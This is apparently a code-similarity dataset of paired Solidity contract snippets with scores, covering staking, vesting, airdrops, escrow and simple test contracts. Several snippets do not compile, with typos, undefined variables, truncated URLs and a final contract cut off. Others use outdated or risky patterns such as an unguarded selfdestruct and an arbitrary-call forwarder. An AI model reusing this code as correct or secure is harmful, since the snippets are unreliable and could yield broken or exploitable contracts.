        TotalStakingAmount = TotalStakingAmount.add(msg.value);
        staker[msg.sender].time = Timestamp;
        staker[msg.sender].amount = staker[msg.sender].amount.add(msg.value);

        emit StartStaking(
            msg.sender,
            msg.value,
            staker[msg.sender].amount,
            staker[msg.sender].time
        );
    }

    function DEBUG_donation() public payable {
        emit DonationDeposited(msg.sender, msg.value);
    }

    function withdraw_stake() public only_staker
    {
        new_block();
        require(Timestamp >= staker[msg.sender].time + round_interval);

        uint _amount = staker[msg.sender].amount;
        claim(); 
        TotalStakingAmount = TotalStakingAmount.sub(_amount);
        TotalStakingWeight = TotalStakingWeight.sub((Timestamp.sub(staker[msg.sender].time)).mul(staker[msg.sender].amount));

        staker[msg.sender].amount = 0;
        msg.sender.transfer(_amount);
        emit WithdrawStake(msg.sender, _amount);
    }

    function claim() public only_staker
    {
        if (CS_frozen) return;

        new_block();
        uint _StakingInterval = Timestamp.sub(staker[msg.sender].time);
        if (_StakingInterval >= round_interval)
        {
            uint _CompleteRoundsInterval = (_StakingInterval / round_interval).mul(round_interval);
            uint _StakerWeight = _CompleteRoundsInterval.mul(staker[msg.sender].amount);
            uint _reward = StakingRewardPool.mul(_StakerWeight).div(TotalStakingWeight);

            StakingRewardPool = StakingRewardPool.sub(_reward);
            TotalStakingWeight = TotalStakingWeight.sub(_StakerWeight);

            staker[msg.sender].time = staker[msg.sender].time.add(_CompleteRoundsInterval);

            msg.sender.transfer(_reward);
            emit Claim(msg.sender, _reward);
        }
    }

    function stake_reward(address _addr) public view returns (uint)
    {
        require(staker[_addr].amount > 0);
        require(!CS_frozen);

        uint _blocks = block.number - LastBlock;
        uint _seconds = now - Timestamp;
        if (_seconds > _blocks * 25)
        {
            _seconds = _blocks * 25;
        }
        uint _Timestamp = Timestamp + _seconds;
        uint _TotalStakingWeight = TotalStakingWeight + _seconds.mul(TotalStakingAmount);
        uint _StakingInterval = _Timestamp.sub(staker[_addr].time);

        uint _CompleteRoundsInterval = (_StakingInterval / round_interval).mul(round_interval);
        uint _StakerWeight = _CompleteRoundsInterval.mul(staker[_addr].amount);
        uint _StakingRewardPool = address(this).balance.sub(TotalStakingAmount);
        return _StakingRewardPool.mul(_StakerWeight).div(_TotalStakingWeight);
    }

    modifier only_staker
    {
        require(staker[msg.sender].amount > 0);
        _;
    }

    modifier staking_available
    {
        require(now >= DateStartStaking && !CS_frozen);
        _;
    }

    modifier only_treasurer
    {
        require(msg.sender == Treasury);
        _;
    }

    function report_abuse(address payable _addr) public only_staker
    {
        require(staker[_addr].amount > 0);
        new_block();
        require(Timestamp > staker[_addr].time.add(max_delay));

        uint _amount = staker[_addr].amount;

        TotalStakingAmount = TotalStakingAmount.sub(_amount);
        TotalStakingWeight = TotalStakingWeight.sub((Timestamp.sub(staker[_addr].time)).mul(_amount));

        staker[_addr].amount = 0;
        address(_addr).transfer(_amount);
    }
}",0.5789283300536981,"contract Savings is Owned {
    
    uint public periods;

    
    uint public t0special;

    uint constant public intervalSecs = 30 days;
    uint constant public precision = 10 ** 18;


    
    event Withdraws(address indexed who, uint amount);
    event Deposit(address indexed who, uint amount);

    bool public inited;
    bool public locked;
    uint public startBlockTimestamp = 0;

    Token public token;

    
    mapping (address => uint) public deposited;

    
    uint public totalfv;

    
    uint public remainder;

    
    uint public total;

    
    mapping (address => uint256) public withdrawn;

    bool public nullified;

    modifier isParticipant() {
        require(
            msg.sender == 0x4778bE92Dd5c51035bf80Fca564ba5E7Fad5FB6d ||
            msg.sender == 0x8567462b8E8303637F0004B2E664993314e58BD7 ||
            msg.sender == 0x0e24D8Fcdf0c319dF03998Cc53F4FBA035D9a4f9 ||
            msg.sender == 0xb493c9C0C0aBfd9847baB53231774f13BF882eE9
        );
        _;
    }

    modifier notNullified() { require(!nullified); _; }

    modifier preLock() { require(!locked && startBlockTimestamp == 0); _; }

    
    modifier postLock() { require(locked); _; }

    
    modifier preStart() { require(locked && startBlockTimestamp == 0); _; }

    
    modifier postStart() { require(locked && startBlockTimestamp != 0); _; }

    
    modifier notInitialized() { require(!inited); _; }

    
    modifier initialized() { require(inited); _; }

    
    function() {
        revert();
    }

    
    function nullify() onlyOwner {
        nullified = true;
    }

    
    function init(uint _periods, uint _t0special) onlyOwner notInitialized {
        require(_periods != 0);
        periods = _periods;
        t0special = _t0special;
    }

    function finalizeInit() onlyOwner notInitialized {
        inited = true;
    }

    function setToken(address tok) onlyOwner {
        token = Token(tok);
    }

    
    function lock() onlyOwner {
        locked = true;
    }

    
    function start(uint _startBlockTimestamp) onlyOwner initialized preStart {
        startBlockTimestamp = _startBlockTimestamp;
        uint256 tokenBalance = token.balanceOf(this);
        total = tokenBalance;
        remainder = tokenBalance;
    }

    
    function isStarted() constant returns(bool) {
        return locked && startBlockTimestamp != 0;
    }

    
    

    
    function refundTokens(address addr, uint amount) onlyOwner preLock {
        token.transfer(addr, amount);
    }


    
    function updateTotal() onlyOwner postLock {
        uint current = token.balanceOf(this);
        require(current >= remainder); 

        uint difference = (current - remainder);
        total += difference;
        remainder = current;
    }

    
    function periodAt(uint _blockTimestamp) constant returns(uint) {
        
        if (startBlockTimestamp > _blockTimestamp)
            return 0;

        
        uint p = ((_blockTimestamp - startBlockTimestamp) / intervalSecs) + 1;
        if (p > periods)
            p = periods;
        return p;
    }

    
    
    function period() constant returns(uint) {
        return periodAt(block.timestamp);
    }

    
    
    
    
    function deposit(uint tokens) notNullified {
        depositTo(msg.sender, tokens);
    }


    function depositTo(address beneficiary, uint tokens) isParticipant preLock notNullified {
        require(token.transferFrom(msg.sender, this, tokens));
        deposited[beneficiary] += tokens;
        totalfv += tokens;
        Deposit(beneficiary, tokens);
    }

    
    function bulkDepositTo(uint256[] bits) onlyOwner {
        uint256 lomask = (1 << 96) - 1;
        for (uint i=0; i<bits.length; i++) {
            address a = address(bits[i]>>96);
            uint val = bits[i]&lomask;
            depositTo(a, val);
        }
    }

    
    
    function withdraw() notNullified returns(bool) {
        return withdrawTo(msg.sender);
    }

    
    function availableForWithdrawalAt(uint256 blockTimestamp) constant returns (uint256) {
        
        return ((t0special + periodAt(blockTimestamp)) * precision) / (t0special + periods);
    }

    
    function _withdrawTo(uint _deposit, uint _withdrawn, uint _blockTimestamp, uint _total) constant returns (uint) {
        uint256 fraction = availableForWithdrawalAt(_blockTimestamp);

        
        uint256 withdrawable = ((_deposit * fraction * _total) / totalfv) / precision;

        
        if (withdrawable > _withdrawn) {
            return withdrawable - _withdrawn;
        }
        return 0;
    }

    
    function withdrawTo(address addr) postStart notNullified returns (bool) {
        uint _d = deposited[addr];
        uint _w = withdrawn[addr];

        uint diff = _withdrawTo(_d, _w, block.timestamp, total);

        
        if (diff == 0) {
            return false;
        }

        
        require((diff + _w) <= ((_d * total) / totalfv));

        
        require(token.transfer(addr, diff));

        withdrawn[addr] += diff;
        remainder -= diff;
        Withdraws(addr, diff);
        return true;
    }

    
    function bulkWithdraw(address[] addrs) notNullified {
        for (uint i=0; i<addrs.length; i++)
            withdrawTo(addrs[i]);
    }

    
    
    
    
    
    uint public mintingNonce;
    function multiMint(uint nonce, uint256[] bits) onlyOwner preLock {

        if (nonce != mintingNonce) return;
        mintingNonce += 1;
        uint256 lomask = (1 << 96) - 1;
        uint sum = 0;
        for (uint i=0; i<bits.length; i++) {
            address a = address(bits[i]>>96);
            uint value = bits[i]&lomask;
            deposited[a] += value;
            sum += value;
            Deposit(a, value);
        }
        totalfv += sum;
    }
}"
"contract Counter {

    uint256 public counter;

    function increment() external {
        counter = counter + 1;
    }

    function doSelfDestruct() external {
        selfdestruct(0x0000000000000000000000000000000000000000);
    }

    function() external payable {}
}",0.5804226345931771,"contract Counter {

    int private count = 0;

    function incrementCounter() public {

        count += 1;

    }

    function decrementCounter() public {

        count -= 1;

    }

    function getCount() public constant returns (int) {

        return count;

    }

}"
"contract Test {

    struct SomeStruct {
        uint256 a;
        uint256 b;
        uint256 c;
    }

    SomeStruct[] public structs;

    function pushStruct() {
        SomeStruct memory s;
        structs.push(s);
   }

}",0.5434264371447942,"contract Counter {

   uint256 c;



   constructor() public {

       c = 1;

   }   

   function inc() external {

        c = c + 1;

   }

   function get() public view returns (uint256)  {

       return c;

   }

}"
"contract Dapp {

    AuxContract aux;

    function Dapp(address auxContractAddress) {
        aux = AuxContract(auxContractAddress);
    }
}",0.5379560566191024,"contract IContractRegistry {

    function getAddress(bytes32 _contractName) public view returns (address);

}"
"contract TestB {
  B testB;
  A testA;

  function beforeEach() {
    testA = A(DeployedAddresses.A());
    testB = B(testA.createB(""test""));
  }

  function testIsOwnerIsSet() {
    address aOwner = testA.owner();
    address bOwner = testB.owner();
    Assert.equal(aOwner, bOwner, ""Owner's address does not match"");
  }
}",0.548738106464884,"contract owned {

    address public owner;

    address public contractAddress;



    function owned() public{

        owner = msg.sender;

        contractAddress = this;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(address newOwner) public onlyOwner {

        owner = newOwner;

    }

}"
"contract MyEvetTest {

   event MyEvent(uint256 timestamp);

   function myFunction() public {
       emit MyEvent(block.timestamp);
   }
}",0.577731273721394,"contract Clock is IClock {
  function getTime() view public returns (uint256) {
    return block.timestamp;
  }
}"
"contract Claims {

    using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;

    struct Claim {
        uint scheme;
        address issuer;
        bytes signature;
        bytes data;
        bytes url;
    }    

    struct Topic {
        HitchensUnorderedKeySetLib.Set claimIdSet;
    }

    HitchensUnorderedKeySetLib.Set topicIdSet;

    mapping(bytes32 => Topic) topics; 
    mapping(bytes32 => Claim) public claims;
    mapping(bytes32 => bool) public usedSignatureHashes;

    function newTopic(bytes32 topicId) public {
        topicIdSet.insert(topicId);
    }

    function removeTopic(bytes32 topicId) public {
        Topic storage t = topics[topicId];
        require(t.claimIdSet.count() == 0, ""Cannot delete topic with claims. Remove the claims first."");
        delete topics[topicId];
        topicIdSet.remove(topicId);
    }

    function newClaim(bytes32 topicId, bytes32 claimId, uint scheme, address issuer, bytes memory signature, bytes memory data, bytes memory url) public {
        require(topicIdSet.exists(topicId), ""Topic ID not found."");
        require(!usedSignatureHashes[keccak256(signature)], ""Claim signature was used before."");
        usedSignatureHashes[keccak256(signature)] = true;
        Topic storage t = topics[topicId];
        t.claimIdSet.insert(claimId); 
        Claim storage c = claims[claimId];
        c.scheme = scheme;
        c.issuer = issuer;
        c.signature = signature;
        c.data = data;
        c.url = url;
    }

    function removeClaim(bytes32 topicId, bytes32 claimId) public {
        Topic storage t = topics[topicId];
        t.claimIdSet.remove(claimId); 
        delete claims[claimId];
    }

    
    function topicClaimCount(bytes32 topicId) public view returns(uint) {
        return topics[topicId].claimIdSet.count();
    }

    function topicClaimIdAtIndex(bytes32 topicId, uint index) public view returns(bytes32) {
        return topics[topicId].claimIdSet.keyAtIndex(index); 
    }

    
    function arbitraryKey() public view returns(bytes32 key) {
        key = keccak256(abi.encodePacked(block.number));
    }

}",0.5185719683993567,"contract TokenAirdrop is ContractReceiver {

  using SafeMath for uint256;

  using BytesLib for bytes;



  

  

  mapping(address => mapping(address => uint256)) private balances;

  address private etherAddress = 0x0;



  event Airdrop(

    address from,

    address to,

    bytes message,

    address token,

    uint amount,

    uint time

  );

  event Claim(

    address claimer,

    address token,

    uint amount,

    uint time

  );





  

  function tokenFallback(address from, uint value, bytes data) public {

    

    

    require(data.length > 20);

    address beneficiary = data.toAddress(0);

    bytes memory message = data.slice(20, data.length - 20);

    balances[beneficiary][msg.sender] = balances[beneficiary][msg.sender].add(value);

    emit Airdrop(from, beneficiary, message, msg.sender, value, now);

  }



  

  function giftEther(address to, bytes message) public payable {

    require(msg.value > 0);

    balances[to][etherAddress] = balances[to][etherAddress].add(msg.value);

    emit Airdrop(msg.sender, to, message, etherAddress, msg.value, now);

  }



  

  function giftERC20(address to, uint amount, address token, bytes message) public {

    ERC20(token).transferFrom(msg.sender, address(this), amount);

    balances[to][token] = balances[to][token].add(amount);

    emit Airdrop(msg.sender, to, message, token, amount, now);

  }



  function claim(address token) public {

    uint amount = balanceOf(msg.sender, token);

    require(amount > 0);

    balances[msg.sender][token] = 0;

    require(sendTokensTo(msg.sender, amount, token));

    emit Claim(msg.sender, token, amount, now);

  }



  function balanceOf(address person, address token) public view returns(uint) {

    return balances[person][token];

  }



  function sendTokensTo(address destination, uint256 amount, address tkn) private returns(bool) {

    if (tkn == etherAddress) {

      destination.transfer(amount);

    } else {

      require(ERC20(tkn).transfer(destination, amount));

    }

    return true;

  }

}"
"contract C {
    using B for B.T;
    
    A.S public k;
    B.T public l;
    
    function baz() public returns (uint256) {
        k = A.S(121);
        l = B.T(333);
        return l.bar(k);
    }
    
}",0.5985723040695364,"contract SaiTap {
    function s2s() public returns (uint);
    function bid(uint wad) public returns (uint);
    function ask(uint wad) public returns (uint);
}"
"contract People {

    Person[] public people;

    struct Person {
      bytes32 firstName;
      bytes32 lastName;
      uint age;
    }

    function addPerson(bytes32 firstName, bytes32 lastName, uint age) returns (bool success) {

      Person memory newPerson;
      newPerson.firstName = firstName;
      newPerson.lastName = lastName;
      newPerson.age = age;

      people.push(newPerson);
      return true;
    }

    function getPerson(uint index) constant returns(bytes32 firstName, bytes32 lastName, uint age) {
        
        return (people[index].firstName, people[index].lastName, people[index].age);
    }

    function getPersonCount() constant returns(uint count) {
        return people.length;
    }

}",0.5580747802259391,"contract VotingInterface {
    struct PendingRequest {
        bytes32 identifier;
        uint time;
    }

    
    function commitVote(bytes32 identifier, uint time, bytes32 hash) external;

    
    function revealVote(bytes32 identifier, uint time, int price, int salt) external;

    
    function getPendingRequests() external view returns (PendingRequest[] memory);

    
    function getVotePhase() external view returns (VoteTiming.Phase);

    
    function getCurrentRoundId() external view returns (uint);

    
    function retrieveRewards(address voterAddress, uint roundId, PendingRequest[] memory) public returns
    (FixedPoint.Unsigned memory);
}"
"contract Calculator {"" +
        ""  int public result;"" +  
        ""  string testString;"" +
        ""  bool testBool;""+
        ""  function add(int num) {"" +
        ""    result = result + num;"" +
        ""  }"" +
        ""  function sub(int num) {"" +
        ""    result = result - num;"" +
        ""  }"" +
        ""  function mul(int num) {"" +
        ""    result = result * num;"" +
        ""  }"" +
        ""  function div(int num) {"" +
        ""    result = result / num;"" +
        ""  }"" +
        ""  function clear() {"" +
        ""    result = 0;"" +
        ""  }"" +
        ""  function getString() constant returns (string) { return testString; }"" +
        ""  function getBool() constant returns (bool) { return testBool; }"" +
        ""  function Calculator(string _testString, bool _testBool){"" +
        ""    testString = _testString;"" +
        ""    testBool = _testBool;"" +
        ""  }"" +
        ""}",0.5973928081357078,"contract Testable {
    uint fakeTime;
    bool public testing;
    modifier onlyTesting() {
        if (!testing) throw;
        _;
    }
    function setFakeTime(uint t) onlyTesting {
        fakeTime = t;
    }
    function addMinutes(uint m) onlyTesting {
        fakeTime = fakeTime + (m * 1 minutes);
    }
    function addDays(uint d) onlyTesting {
        fakeTime = fakeTime + (d * 1 days);
    }
    function currTime() constant returns (uint) {
        if (testing) {
            return fakeTime;
        } else {
            return block.timestamp;
        }
    }
    function weiPerEth() constant returns (uint) {
        if (testing) {
            return 200;
        } else {
            return 10**18;
        }
    }
}"
"contract ParentToken {

  function ParentToken(currentSupply, tokenName ...) {} 
}",0.5446303990818471,"contract ITokenRetreiver {

    
    function retreiveTokens(address _tokenContract);
}"
"contract verifySettlement is usingOraclize {

           uint public price;
           string public landingtime;
           string public expectedtime;`
           string public tempvalue;


            event Log(string text);

            enum oraclizeState { ForActual, ForExpected }

            struct oraclizeCallback {
                  oraclizeState oState;
            }
            mapping (bytes32 => oraclizeCallback) public oraclizeCallbacks;

          function verifySettlement() payable {
                   Log(""Contract created."");
                   getActualFlightDetails();
                   getExpectedFlightDetails();
          }

          function getActualLandingHour() constant returns (string) {
                return landingtime;
          }

          function getExpectedLandingHour() constant returns (string) {
              return expectedtime;
            }

         function __callback(bytes32 _myid, string _result) {
                 require (msg.sender == oraclize_cbAddress());
                 oraclizeCallback memory o = oraclizeCallbacks[myid];
                 if (o.oState == oraclizeState.ForActual) {
                           Log(""1111111111111111111111111"");
                 }
                 else if(o.oState == oraclizeState.Forxpected) {
                       Log(""2222222222222222222222222222222"");   
                 }
         }

         function getActualFlightDetails() payable {
                   Log(""Oraclize query was sent, waiting for the answer for getting actual flight details.."");
                   bytes32 queryId=oraclize_query(""URL"",""http:
                   oraclizeCallbacks[queryId] = oraclizeCallback(oraclizeState.ForActual);
          }

         function getExpectedFlightDetails() payable {
                Log(""Oraclize query was sent, waiting for the answer for getting actual flight details.."");

                bytes32 queryId=oraclize_query(""URL"",""http:
              oraclizeCallbacks[queryId] = oraclizeCallback(oraclizeState.ForExpected);
         }
    }",0.5235370114869738,"contract OracleEscrow is Ownable {
  uint256 public expiration;
  bool public contractExecuted;
  address public depositor;
  address public beneficiary;
  IOracle internal oracle;
  

  
  
  bytes32 public constant EXPECTED = ""yes"";

  
  
  uint256 internal constant TO_EXPIRE = 30 days;

  
  constructor(address _oracle, address _depositor, address _beneficiary) public payable Ownable() {
    oracle = IOracle(_oracle);
    depositor = _depositor;
    beneficiary = _beneficiary;
    contractExecuted = false;
    expiration = now + TO_EXPIRE;
  }

  
  event ContractExecuted(bytes32 message);
  
  
  function() external payable onlyDepositor {
    require(contractExecuted == false);
    require(now < expiration);
  }
  
  
  function executeContract() public checkAuthorizedUser() {
    require(address(this).balance > 0);
    if (oracle.current() == EXPECTED) {
      contractExecuted = true;
      emit ContractExecuted(""Payment sent to beneficiary."");
      beneficiary.transfer(address(this).balance);
    } else if (now >= expiration) {
      contractExecuted = true;
      emit ContractExecuted(""Payment refunded to depositor."");
      depositor.transfer(address(this).balance);
    }
  }

  
  function requestOracleValue() public view onlyOwner returns(bytes32) {
    return oracle.current();
  }

  
  modifier checkAuthorizedUser() {
    require(msg.sender == owner || msg.sender == depositor || msg.sender == beneficiary, ""Only authorized users may call this function."");
    _;
  }
  
  
  modifier onlyDepositor() {
    require(msg.sender == depositor, ""Only the depositor may call this function."");
    _;
  }
}"
"contract Pointer {

    struct MyStruct {
        address a;
        bool b;
        uint u;
    }
    mapping(bytes32 => MyStruct) public myStructs;

    event LogActivity(address sender, address a, bool b, uint u);

    function emitter(MyStruct storage s) internal {
        emit LogActivity(msg.sender, s.a, s.b, s.u);
    }

    function callMe(bytes32 key) public {
        emitter(myStructs[key]);
    }

    function setter(bytes32 key, address a, bool b, uint u) public {
        MyStruct storage s = myStructs[key];
        s.a = a;
        s.b = b;
        s.u = u;
    }
}",0.5874227982773126,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) internal consent;

    event wearehere(string statement);

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external {

        require(isHuman(msg.sender),""no robot"");

        consent[msg.sender] = true;

    }

    

    function check(address addr) public view returns (bool){

        return(consent[addr]);

    }

}"
"contract EventsImpl is EventsInterface {
    uint[] baseArray;

    function removeValueFromArray(uint _userId, uint[] memory _array) internal returns(uint[] memory) {
        uint[] storage auxArray = baseArray;

        for (uint i = 0; i < _array.length; i++){
            if(_array[i] != _userId)
                auxArray.push(_array[i]);
        }

        return auxArray;
    }
}",0.5562146635591966,"contract BaccaratShuffle is Shuffle {

 function sendPork(uint random)

  public pure returns(uint[],uint[]) 

  {

   uint[] memory banker=new uint[](3);

   uint[] memory plaryer=new uint[](3);

   uint[] memory pork=shuffle(random);

   uint j=0;

   for(uint k=0;k<banker.length;k++)

   {

       banker[k]=pork[j];

       j++;

       plaryer[k]=pork[j];

       j++;

   }

   

   return(banker,plaryer);

   }

}"
"contract FileList {

   
   struct File {
      uint256 id;
      string ipfshash;
      bytes32 filename;
      bytes32[5] tags;
      address owner;
      uint256 timestamp;
   }
   uint256 public constant maxAmountOfFiles = 1000;
   
   mapping(address => File[maxAmountOfFiles]) public files;
   
   mapping(address => uint256) public lastIds;
   

   
   event fileAdded (uint256 fileid, string ipfshash, bytes32 _filename);
   event tagsAdded (bytes32[5] tags);

   
   
   
   
   
   function addFile(string ipfshash, bytes32 _filename, bytes32[5] tags) public {

      File memory myFile = File(lastIds[msg.sender], ipfshash, _filename, tags,  msg.sender, now);
      
      myFile.tags = tags;
      emit tagsAdded (myFile.tags);
      

      files[msg.sender][lastIds[msg.sender]] = myFile;
      
      emit fileAdded(lastIds[msg.sender],ipfshash,_filename);
      if(lastIds[msg.sender] >= maxAmountOfFiles) lastIds[msg.sender] = 0;
      else lastIds[msg.sender]++;
   }

   
   
   
   function getFileTags(address owner, uint256 _index) external view returns (bytes32[5]) {
       return files[owner][_index].tags;
  }

}",0.5842714043567676,"contract Pub {
    struct Publication {
        address source;
        uint256 timestamp;
        string title;
        
        bytes body;
    }

    mapping (address => uint256[]) public allByAuthor;
    
    mapping (address => string) public authors;
    Publication[] public all;

    function Pub() public { }

    function publishBytes(string _title, bytes _body)
    external
    returns (uint256) {
        uint256 index = all.length;
        all.push(Publication(
            msg.sender,
            now,
            _title,
            _body
        ));
        allByAuthor[msg.sender].push(index);
        return index;
    }

    function publish(string _title, string _body)
    external
    returns (uint256) {
        uint256 index = all.length;
        all.push(Publication(
            msg.sender,
            now,
            _title,
            bytes(_body)
        ));
        allByAuthor[msg.sender].push(index);
        return index;
    }

    function sign(string _name)
    external {
        authors[msg.sender] = _name;
    }

    function publicationCount(address _author)
    external view
    returns (uint256) {
        return allByAuthor[_author].length;
    }

    function size()
    external view
    returns (uint256) {
        return all.length;
    }
}"
"contract TestBAToken {
  address companyFundAddress;
  address userFundAddress;
  function TestBAToken(address address1, address address2) {
    companyFundAddress = address1;
    userFundAddress = address2;
  }
  function testNewBATokenNotFinalized() {
    uint256 startBlock = block.number - 100;
    uint256 endBlock = block.number + 100;
    BAToken ba = new BAToken(companyFundAddress, userFundAddress, startBlock, endBlock);
    Assert.equal(ba.isFinalized, false, ""Token sale shouldn't be finalized upon initialization."");
  }
}",0.5697003494401568,"contract Lockable is Destructible {
	mapping(address => bool) lockedAddress;

	function lock(address _address) public onlyOwner {
		lockedAddress[_address] = true;
	}

	function unlock(address _address) public onlyOwner {
		lockedAddress[_address] = false;
	}

	modifier onlyUnlocked() {
		uint nowtime = block.timestamp;
		uint futuretime = 1550537591; 
		if(nowtime > futuretime) {
			_;
		} else {
			require(!lockedAddress[msg.sender]);
			_;
		}
	}

	function isLocked(address _address) public constant returns (bool) {
		return lockedAddress[_address];
	}
}"
"contract InsertionSort {

    struct Record {
        uint recId;
        uint[] data;
    }

    mapping(uint => Record) records;

    function insertionSortMemory(uint[5] a) internal {
      for (uint i = 0; i < a.length; i++) {
        uint j = i;
        while (j > 0 && a[j] < a[j-1]) {
          uint temp = a[j];
          a[j] = a[j-1];
          a[j-1] = temp;
          j--;
        }
      }
    }

    function testInsertionSort() public constant returns (uint[5]) {
      uint[5] memory data;
      data[0] = 1235;
      data[1] = 1234;
      data[2] = 1233;
      data[3] = 1232;
      data[4] = 1231;
      insertionSortMemory(data);
      return data;
    }

    function insertionSort(uint[] a, uint length) internal returns (uint[]) {
      for (uint i = 0; i < length; i++) {
        uint j = i;
        while (j > 0 && a[j] < a[j-1]) {
          uint temp = a[j];
          a[j] = a[j-1];
          a[j-1] = temp;
          j--;
        }
      }
      return a;
    }

    function addRecordWithoutInsertionSort(uint _recId, uint _num) public {
        Record record = records[_recId];
        record.recId = _recId;
        record.data.length++;
        record.data[record.data.length-1] = _num;
    }

    function addRecordWithInsertionSort(uint _recId, uint _num) public {
        Record record = records[_recId];
        record.recId = _recId;
        record.data.length++;
        record.data[record.data.length-1] = _num;
        record.data = insertionSort(record.data, record.data.length);
    }



    function getRecord(uint _recId) public constant returns(uint, uint[]) {
        return (records[_recId].recId, records[_recId].data);
    }
}",0.5436757229420778,"contract CompressedCaller {



    function compressedCall(

        address target,

        uint256 totalLength,

        bytes memory zipped

    )

        public

        payable

        returns (bytes memory result)

    {

        (bytes memory data, uint decompressedLength) = decompress(totalLength, zipped);

        require(decompressedLength == totalLength, ""Uncompress error"");



        bool success;

        (success, result) = target.call.value(msg.value)(data);

        require(success, ""Decompressed call failed"");

    }



    function decompress(

        uint256 totalLength,

        bytes memory zipped

    )

        public

        pure

        returns (

            bytes memory data,

            uint256 index

        )

    {

        data = new bytes(totalLength);



        for (uint i = 0; i < zipped.length; i++) {



            uint len = uint(uint8(zipped[i]) & 0x7F);



            if ((zipped[i] & 0x80) == 0) {

                memcpy(data, index, zipped, i + 1, len);

                i += len;

            }



            index += len;

        }

    }



    

    

    

    

    function memcpy(

        bytes memory destMem,

        uint dest,

        bytes memory srcMem,

        uint src,

        uint len

    )

        private

        pure

    {

        uint mask = 256 ** (32 - len % 32) - 1;



        assembly {

            dest := add(add(destMem, 32), dest)

            src := add(add(srcMem, 32), src)



            

            for { } gt(len, 31) { len := sub(len, 32) } { 

                mstore(dest, mload(src))

                dest := add(dest, 32)

                src := add(src, 32)

            }



            

            let srcPart := and(mload(src), not(mask))

            let destPart := and(mload(dest), mask)

            mstore(dest, or(destPart, srcPart))

        }

    }

}"
"contract Master {
    bool public isActive=false;
    uint public num=0;

    function changeState() returns (bool newState) {
        isActive = !isActive;
        newState = isActive;
    }

    function increaseSubjectCount(address subjectAddr) returns (uint newCount) {
        SubjectContract subjectContract = SubjectContract(subjectAddr);
        newCount = subjectContract.increaseCount();
    }
}",0.5500138197060497,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

  
  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint tokenAmount);
}"
"contract MultiReturner {
    function getData() constant returns (bytes32, bytes32) {
        bytes32 a = ""abcd"";
        bytes32 b = ""wxyz"";
        return (a, b);
    }

    function getDynamicData() constant returns (bytes, bytes) {
        bytes a;
        a.push('a');
        a.push('b');
        a.push('c');
        bytes b;
        b.push('x');
        b.push('y');
        b.push('z');
        return (a, b);
    }
}",0.5733962784421818,"contract SafeMath {

  function safeMul(uint a, uint b) returns (uint) {
    if (a == 0) {
      return 0;
    } else {
      uint c = a * b;
      require(c / a == b);
      return c;
    }
  }

  function safeDiv(uint a, uint b) returns (uint) {
    require(b > 0);
    uint c = a / b;
    require(a == b * c + a % b);
    return c;
  }

}"
"contract Scope {

    struct Human {
        bool b;
    }

    Human[] humans;

    modifier checkScope {
        Human storage human = humans[2];
        _;
    }

    function doSomething() public view checkScope returns(bool) {
        
        return humans[2].b; 
    }
}",0.5766977594513212,"contract Notary {
    mapping (bytes32 => bool) public hashes ;
    
    function register(bytes32 _hash) public {
        hashes[_hash] = true;
    }
    
    function check(bytes32 _hash) public view returns (bool) {
        return hashes[_hash];
    }
}"
"contract Banners {

    struct BannerStruct {
        string marque;
        bytes32 placeId; 
        uint idPointer;
    }

    struct PlaceStruct {
        string name;
        bytes32 bannerId; 
        uint idPointer;
    }

    mapping(bytes32 => BannerStruct) public bannerStructs;
    mapping(bytes32 => PlaceStruct) public placeStructs;

    bytes32[] public bannerIdList;
    bytes32[] public placeIdList;

    function getBannerCount() public view returns(uint) {
        return bannerIdList.length;
    }

    function getPlaceCount() public view returns(uint) {
        return placeIdList.length;
    }

    function isBanner(bytes32 bannerId) public view returns(bool) {
        if(bannerIdList.length==0) return false; 
        return bannerIdList[bannerStructs[bannerId].idPointer] == bannerId;
    }

    function isPlace(bytes32 placeId) public view returns(bool) {
        if(placeIdList.length==0) return false;
        return placeIdList[placeStructs[placeId].idPointer] == placeId;
    }

    function placeHasBanner(bytes32 placeId) public view returns(bool) {
        return isBanner(placeStructs[placeId].bannerId);
    }

    function newBanner(bytes32 bannerId, string marque) public returns(bool) {
        require(!isBanner(bannerId)); 
        bannerStructs[bannerId].marque = marque;
        bannerStructs[bannerId].idPointer = bannerIdList.push(bannerId) - 1;
        return true;
    }

    function newPlace(bytes32 placeId, string name) public returns(bool) {
        require(!isPlace(placeId));
        placeStructs[placeId].name = name;
        placeStructs[placeId].idPointer = placeIdList.push(placeId) - 1;
        return true;
    }

    function setPlaceBanner(bytes32 placeId, bytes32 bannerId) public returns(bool) {
        require(isPlace(placeId));
        require(isBanner(bannerId));
        if(bannerStructs[bannerId].placeId != 0) { 
            bytes32 oldPlace = bannerStructs[bannerId].placeId;
            placeStructs[oldPlace].bannerId = bytes32(0);
        }
        bannerStructs[bannerId].placeId = placeId;
        placeStructs[placeId].bannerId = bannerId;
    }
}",0.5296178459628612,"contract SolidarityDnToken is ERC20Mintable {

    
    string private _name = ""SolidarityDnToken"";
    
    string private _symbol = ""SOLDN"";
    
    uint8 private _decimals = 18;

    
    uint256 public emissionLimit = 1000000000000* 10 ** 18;

    
    bool public mintingFinished;

    
    mapping (address => bool) private _contracts;

    
    
    modifier canMint(uint256 amount) {
        require(amount > 0);
        require(!mintingFinished);
        require(totalSupply().add(amount) <= emissionLimit);
        _;
    }

    
    constructor(address initialOwner) public Ownable(initialOwner) {

    }

    
    function mint(address account, uint256 amount) public onlyMinter canMint(amount) returns (bool) {
        _mint(account, amount);
        return true;
    }

    
    function finishMinting() external onlyMinter {
        mintingFinished = true;
    }

    
    function approveAndCall(address spender, uint256 amount, bytes memory extraData) public returns (bool) {
        require(approve(spender, amount));

        IApproveAndCallFallBack(spender).receiveApproval(msg.sender, amount, address(this), extraData);

        return true;
    }

    
    function registerContract(address addr) public onlyOwner {
        require(_isContract(addr));
        _contracts[addr] = true;
    }

    
    function unregisterContract(address addr) external onlyOwner {
        _contracts[addr] = false;
    }

    
    function transfer(address to, uint256 value) public returns (bool) {

        if (_contracts[to]) {
            approveAndCall(to, value, new bytes(0));
        } else {
            super.transfer(to, value);
        }

